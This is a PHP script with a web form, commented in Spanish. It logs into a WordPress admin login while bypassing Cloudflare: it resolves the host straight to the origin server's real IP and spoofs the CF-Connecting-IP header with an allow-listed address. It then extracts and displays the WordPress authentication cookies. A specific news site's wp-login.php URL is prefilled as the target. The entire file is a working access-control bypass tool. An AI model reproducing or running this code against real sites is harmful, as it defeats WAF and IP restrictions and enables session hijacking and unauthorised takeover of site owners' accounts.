<?php 
$cookies = array();
if(isset($_POST) and !empty($_POST)){
	
	// Paso los datos del formulario a variables
	$ip_real = $_POST['ipreal'];
	$url_login = $_POST['loginurl'];
	$ip_habilitada = $_POST['ipallow'];
	$username = $_POST['username'];
	$password = $_POST['password'];
	
	// Obtengo host de $url_login
	$host = parse_url($url_login, PHP_URL_HOST);
	
	// Data login	
	$data_post = array(
		"log"  => $username,
		"pwd" => $password
	);

	$ch = curl_init(); 
	
	// Seteo la URL donde se realizara la peticion
	curl_setopt($ch, CURLOPT_URL, $url_login);
	//
	
	// Envio IP Habilitada como campo CF-Connecting-IP en la cabecera HTTP
	curl_setopt($ch, CURLOPT_HTTPHEADER, array("CF-Connecting-IP: {$ip_habilitada}"));
	//
	
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($ch, CURLOPT_POST, 1);
	curl_setopt($ch, CURLOPT_HEADER, 1);
	
	// Incluyo los datos de usuario y contrasena
	curl_setopt($ch, CURLOPT_POSTFIELDS, $data_post);
	//
	
	// Bypass Cloudflare, similar a editar archivo HOST
	curl_setopt($ch, CURLOPT_RESOLVE, array("{$host}:80:{$ip_real}","www.{$host}:80:{$ip_real}"));
	//
	
	$output = curl_exec($ch);
	curl_close($ch);
	preg_match_all('/^Set-Cookie:\s*([^;]*)/mi', $output, $matches);
	if(!empty($matches)){
		foreach($matches[1] as $item) {
			if(strpos($item, 'wordpress_') !== false and strpos($item, 'wordpress_logged_in_') === false and strpos($item, 'wordpress_test_cookie') === false){
				parse_str($item, $cookie);
				$cookies = array_merge($cookies, $cookie);
			}
		}
	}
	
}

?>
<style>
	input {
		width: 400px;
	}
</style>
<form action="" method="POST">
<table>
	<tr>
		<td>IP Real Server:</td>
		<td><input type="text" name="ipreal" value="" /></td>
	</tr>
	<tr>
		<td>URL login WordPress</td>
		<td><input type="text" name="loginurl" value="http://elcronista-reportero.com/wp-login.php" /></td>
	</tr>
	<tr>
		<td>IP Habilitada:</td>
		<td><input type="text" name="ipallow" value="" /></td>
	</tr>
	<tr>
		<td>Usuario:</td>
		<td><input type="text" name="username" value="" /></td>
	</tr>
	<tr>
		<td>Contraseña:</td>
		<td><input type="text" name="password" value="" /></td>
	</tr>
</table>
<br>
<input type="submit">
</form>
<br>
<hr>
<br>
<?php 
if(!empty($cookies)){ 

	foreach($cookies as $key => $value){ 
		echo "<br>";
		echo "<strong>Cookie name:</strong> ".$key;
		echo "<br>";
		echo "<strong>Cookie Value:</strong> ".$value;
		echo "<br>";
		echo "<br>";
		echo "hostOnly ; sesion";
	} 
} 
?>